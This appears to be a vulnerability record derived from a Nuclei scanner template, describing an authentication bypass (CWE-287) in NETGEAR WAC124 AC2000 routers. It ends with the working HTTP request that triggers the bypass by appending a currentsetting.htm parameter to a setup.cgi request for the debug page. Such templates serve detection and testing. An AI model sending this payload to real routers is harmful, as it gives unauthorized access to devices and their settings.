# Vulnerability: NETGEAR WAC124 - Authentication Bypass
**Classification:** CWE-287
**Source:** Nuclei Template (`netgear-wac124-router-auth-bypass.yaml`)

## Description
NETGEAR WAC124 AC2000 routers contain an authentication bypass vulnerability. An attacker can gain access by bypassing proper authentication, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/setup.cgi?next_file=debug.htm&x=currentsetting.htm
```

